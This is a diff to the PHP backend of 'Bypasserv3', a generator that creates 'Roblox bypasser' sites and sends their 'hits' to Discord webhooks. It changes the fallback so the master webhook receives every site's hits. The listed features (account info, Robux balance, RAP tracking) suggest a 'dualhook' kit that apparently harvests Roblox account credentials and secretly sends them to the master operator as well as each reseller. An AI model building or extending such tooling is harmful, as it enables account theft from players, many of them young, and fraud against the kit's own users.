@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Dualhook Instance Creator
- * Updated with dual webhook support
+ * Updated with per-instance user webhooks
  */
 
 header('Content-Type: application/json');
@@ -83,14 +83,8 @@ if (!validateWebhook($masterWebhook)) {
     exit;
 }
 
-// User Webhook validation
-if (empty($userWebhook)) {
-    http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'User webhook URL is required']);
-    exit;
-}
-
-if (!validateWebhook($userWebhook)) {
+// User Webhook validation (if provided)
+if (!empty($userWebhook) && !validateWebhook($userWebhook)) {
     http_response_code(400);
     echo json_encode(['success' => false, 'error' => 'Invalid user webhook URL. Please check your Discord webhook.']);
     exit;
@@ -112,7 +106,7 @@ if (!checkRateLimit($clientIP, 10, 3600)) {
 $instanceData = [
     'directory' => $directory,
     'masterWebhook' => $masterWebhook,
-    'userWebhook' => $userWebhook,
+    'userWebhook' => $userWebhook ?: $masterWebhook, // Use master if user webhook not provided
     'createdAt' => date('c'),
     'createdIP' => $clientIP,
     'stats' => [
@@ -140,35 +134,39 @@ saveInstanceData($directory, $instanceData);
 $masterPayload = [
     'embeds' => [[
         'title' => '✅ New Site Generated',
-        'description' => "**Site Name:** `{$directory}`\n**Public URL:** `https://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/public/?dir={$directory}`\n**Master Webhook:** Connected\n**User Webhook:** Connected",
+        'description' => "**Site Name:** `{$directory}`\n**Public URL:** `https://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/public/?dir={$directory}`",
         'color' => 3066993,
         'fields' => [
-            ['name' => 'Status', 'value' => '🟢 Active', 'inline' => true],
+            ['name' => 'Master Webhook', 'value' => '✓ Connected - Receives ALL hits', 'inline' => false],
+            ['name' => 'User Webhook', 'value' => $userWebhook ? '✓ Connected - Receives ONLY hits from this site' : '✗ Not set - Using master webhook', 'inline' => false],
             ['name' => 'Created', 'value' => date('Y-m-d H:i:s'), 'inline' => true],
             ['name' => 'IP', 'value' => $clientIP, 'inline' => true]
         ],
-        'footer' => ['text' => 'Bypasserv3 Dualhook Generator'],
+        'footer' => ['text' => 'Bypasserv3 Master Admin Panel'],
         'timestamp' => date('c')
     ]]
 ];
 sendWebhookNotification($masterWebhook, $masterPayload);
 
 // ============================================
-// SEND USER WEBHOOK NOTIFICATION
+// SEND USER WEBHOOK NOTIFICATION (if different from master)
 // ============================================
-$userPayload = [
-    'embeds' => [[
-        'title' => '🎉 Your Bypasser Site is Ready!',
-        'description' => "Your Roblox bypasser site has been created successfully!\n\n**Site:** `{$directory}`\n**Link:** `https://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/public/?dir={$directory}`",
-        'color' => 3447003,
-        'fields' => [
-            ['name' => '✨ Features', 'value' => '• Account Info Fetching\n• Robux Balance Display\n• RAP Value Tracking\n• Full Account Statistics', 'inline' => false]
-        ],
-        'footer' => ['text' => 'Bypasserv3'],
-        'timestamp' => date('c')
-    ]]
-];
-sendWebhookNotification($userWebhook, $userPayload);
+if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
+    $userPayload = [
+        'embeds' => [[
+            'title' => '🎉 Your Bypasser Site is Ready!',
+            'description' => "Your Roblox bypasser site has been created successfully!\n\n**Site:** `{$directory}`\n**Link:** `https://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/public/?dir={$directory}`",
+            'color' => 3447003,
+            'fields' => [
+                ['name' => '✨ Features', 'value' => '• Account Info Fetching\n• Robux Balance Display\n• RAP Value Tracking\n• Full Account Statistics\n• Works for all countries', 'inline' => false],
+                ['name' => '📊 Webhook Info', 'value' => 'This webhook will only receive hits from YOUR site', 'inline' => false]
+            ],
+            'footer' => ['text' => 'Bypasserv3 Instance Generator'],
+            'timestamp' => date('c')
+        ]]
+    ];
+    sendWebhookNotification($userWebhook, $userPayload);
+}
 
 // Update global stats
 updateGlobalStats('totalInstances', 1);
